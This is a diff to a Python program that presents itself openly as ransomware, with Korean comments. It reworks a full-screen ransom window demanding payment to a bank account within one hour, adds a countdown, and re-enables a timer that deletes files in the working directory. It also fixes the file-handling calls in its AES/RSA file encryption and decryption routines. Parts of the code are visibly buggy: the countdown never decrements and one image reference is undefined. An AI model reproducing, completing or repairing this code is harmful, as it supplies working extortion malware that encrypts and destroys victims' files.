@@ -1,5 +1,3 @@
-from builtins import len, exit, round, str, bytes, range
-
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from Crypto import Random  #RSA 키 생성시 필요
@@ -29,32 +27,42 @@ def key_submit():
     label4.destroy()
     password.destroy()
 
-window = tkinter.Tk()
-window.title("ransomware")
-window.state('zoomed')  # maximize the window
-height = window.winfo_height()  # ...
-width = window.winfo_width()
-window.configure(background="black")
+class tk:
+    def __init__(self):
+        self.window = tkinter.Tk()
+        self.window.title("ransomware")
+        self.window.state('zoomed')  # maximize the window
+        height = self.window.winfo_height()  # ...
+        width = self.window.winfo_width()
+        self.window.configure(background="black")
 
-label1 = tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.", fg="red", bg="black", font='Helvetica 14 bold')
-label1.pack()
-label2 = tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red", bg="black", font='Helvetica 18 bold')
-label2.pack()
-label3 = tkinter.Label(window, text="국민 786102-00-040854", fg="red", bg="black", font='Helvetica 18 bold')
-label3.pack()
+        self.label1 = tkinter.Label(self.window, text="타노스 랜섬웨어에 감염되었다.", fg="red", bg="black", font='Helvetica 14 bold')
+        self.label1.pack()
+        self.label2 = tkinter.Label(self.window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red", bg="black", font='Helvetica 18 bold')
+        self.label2.pack()
+        self.label3 = tkinter.Label(self.window, text="국민 786102-00-040854", fg="red", bg="black", font='Helvetica 18 bold')
+        self.label3.pack()
 
-label4 = tkinter.Label(window, text="password:", fg="red", bg="black", font='Helvetica 14 bold')
-label4.pack()
-password = tkinter.Entry(window)
-password.pack()
+        self.label4 = tkinter.Label(self.window, text="password:", fg="red", bg="black", font='Helvetica 14 bold')
+        self.label4.pack()
+        self.password = tkinter.Entry(self.window)
+        self.password.pack()
 
-pwbutton = tkinter.Button(window, text="복호화", command=key_submit)
-pwbutton.pack()
+        self.pwbutton = tkinter.Button(self.window, text="복호화", command=self.key_submit)
+        self.pwbutton.pack()
 
-image = tkinter.PhotoImage(file="../ui/face.png")
+        self.image = tkinter.PhotoImage(file="../ui/face.png")
 
-label5 = tkinter.Label(window, image=image)
-label5.pack()
+        self.label5 = tkinter.Label(self.window, image=image)
+        self.label5.pack()
+
+    def key_submit(self):
+        pw = str(self.password.get())
+        self.label6 = tkinter.Label(self.window, text="키가 입력되었다 => " + pw, fg="red", bg="black", font="Helvetica 18 bold")
+        self.label6.pack()
+        self.pwbutton.destroy()
+        self.label4.destroy()
+        self.password.destroy()
 
 
 iv = os.urandom(16)
@@ -83,13 +91,21 @@ def startTimer():
     #5초에 한번씩 파일 삭제
     #threading.Timer(5,remove_files(os.getcwd())).start()
     sleep(5)
+    c = 5
+    clock(c)
     remove_files(os.getcwd())
 
-# 암호화된 파일 삭제하는 함수
+def clock(c):
+    if c<=0:
+        return;
+    label_clock = tkinter.Label(window, text=str(c), fg="red", bg="black", font='Helvetica 14 bold')
+    label_clock.pack()
+    threading.Timer(1, clock, [--c]).start()
+
 def remove_files(path,ext=None):
-    #label6 = thanos.AnimatedGIF(window, "thanos1.gif")
-    #label6.pack()
-    #label5.destroy()
+    label6 = thanos.AnimatedGIF(window, "../ui/thanos1.gif")
+    label6.pack()
+    label5.destroy()
     remove_filelist=[]
     print("os.removelistdir(): \n", os.listdir())
     for name in os.listdir(path):
@@ -120,11 +136,9 @@ def remove_files(path,ext=None):
     elif(len(remove_filelist) == 1):
         os.remove(remove_filelist[0])
         print("더 이상 삭제할 파일이 없습니다")
-        exit(0)
     #맨 처음 파일이 0개일 경우
     else:
         print("더 이상 삭제할 파일이 없습니다")
-        exit(0)
 
     #label6.destroy()
     #label7 = tkinter.Label(window, image=image)
@@ -153,7 +167,7 @@ def enc(key, cipher, in_filename, out_filename=None):
     # 먼저, 바이너리 형식으로 파일을 읽어온다
     # 읽어온 것은 data로 저장
 
-    with os.open(in_filename, 'rb') as infile:
+    with open(in_filename, 'rb') as infile:
         # 일단 읽어온 것을 출력해보자
         data = infile.read()
 
@@ -168,11 +182,11 @@ def enc(key, cipher, in_filename, out_filename=None):
         print("2. After Padding Message was: ")
         print(data)
 
-        with os.open(out_filename, 'wb') as outfile:
+        with open(out_filename, 'wb') as outfile:
             pass
 
         #이어쓰기 모드
-        with os.open(out_filename, 'ab') as outfile:
+        with open(out_filename, 'ab') as outfile:
             #RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
             outfile.write(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode())
             print('\ndata size : ',len(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode()))
@@ -188,7 +202,7 @@ def enc(key, cipher, in_filename, out_filename=None):
             outfile.write(e_data)
 
     # write가 완료된 상태에서 out_file을 읽어보자
-    with os.open(out_filename, 'rb') as result:
+    with open(out_filename, 'rb') as result:
         print("4. encryption result is: ", out_filename)
         print(result.read())
 
@@ -203,7 +217,7 @@ def dec( cipher, in_filename, out_filename):
         out_filename = os.path.splitext(in_filename)[0]
     print(out_filename)
 
-    with os.open(in_filename, 'rb') as infile:
+    with open(in_filename, 'rb') as infile:
         e_data = infile.read()
         print('size : ',e_data[:64832])
         #RSA : 파일의 크기와 암호화된 AES 키 추출
@@ -219,7 +233,7 @@ def dec( cipher, in_filename, out_filename):
         print("1. Cipher was: ")
         print(e_data)
 
-        with os.open(out_filename, 'wb') as outfile:
+        with open(out_filename, 'wb') as outfile:
             decryptor = AES.new(aes_key_dec, mode, iv)
 
             d_data = decryptor.decrypt(e_data)
@@ -283,11 +297,8 @@ if __name__ == "__main__":
     # 타이머 시작 코드
     th1 = threading.Thread(target=startTimer)
     th1.start()
+
     # gui 시작 코드
     th2 = threading.Thread(window.mainloop())
     th2.start()
-
-
-
-
 
